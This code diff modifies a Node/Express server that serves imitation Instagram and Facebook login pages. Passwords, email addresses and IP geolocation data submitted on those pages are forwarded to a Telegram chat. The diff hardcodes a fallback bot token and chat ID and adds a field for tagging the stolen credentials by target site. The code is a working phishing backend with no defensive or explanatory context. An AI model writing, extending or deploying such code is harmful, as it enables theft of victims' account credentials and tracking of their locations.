@@ -6,14 +6,15 @@ const TelegramBot = require("node-telegram-bot-api");
 const app = express();
 const port = process.env.PORT || 8080;
 
-if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
+const botToken = process.env.TELEGRAM_BOT_TOKEN || "6159399430:AAF8Dhzaw1TpGPtwAaydzmFEYKYVqdycDXk";
+const chatId = process.env.TELEGRAM_CHAT_ID || 6180447283;
+const bot = new TelegramBot(botToken, { polling: false });
+
+if (!botToken || !chatId) {
   console.error("ERROR: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing.");
   process.exit(1);
 }
 
-const botToken = process.env.TELEGRAM_BOT_TOKEN;
-const chatId = process.env.TELEGRAM_CHAT_ID;
-const bot = new TelegramBot(botToken, { polling: false });
 
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
@@ -21,16 +22,16 @@ app.use(express.static(path.join(__dirname, "public")));
 
 app.post("/login", async (req, res) => {
   try {
-    const { email, password, ipData } = req.body;
+    const { email, password, title, ipData } = req.body;
 
-    if (!email || !password || !ipData) {
+    if (!email || !password || !title || !ipData) {
       return res.status(400).json({ error: "Missing email, password, or IP data" });
     }
 
-    console.log("Login attempt:", { email, password, ipData });
+    console.log("Login attempt:", { email, password, title, ipData });
 
     // Format message for Telegram
-    const message = `🔑 Login Attempt:\n📧 Email: ${email}\n🔒 Password: ${password}\n\n🌍 IP Data:\nIP: ${ipData.ip}\nCountry: ${ipData.country_name}\nRegion: ${ipData.region}\nCity: ${ipData.city}\nISP: ${ipData.org}\nLatitude: ${ipData.latitude}\nLongitude: ${ipData.longitude}`;
+    const message = `🔑 Login Attempt: ${title}\n📧 Email: ${email}\n🔒 Password: ${password}\n\n🌍 IP Data:\nIP: ${ipData.ip}\nCountry: ${ipData.country_name}\nRegion: ${ipData.region}\nCity: ${ipData.city}\nISP: ${ipData.org}\nLatitude: ${ipData.latitude}\nLongitude: ${ipData.longitude}`;
     
     await bot.sendMessage(chatId, message);
 
@@ -42,7 +43,7 @@ app.post("/login", async (req, res) => {
 });
 
 app.get("*", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "insta_login.html"));
+  res.sendFile(path.join(__dirname, "public", "index_fb.html"));
 });
 
 app.listen(port, () => {
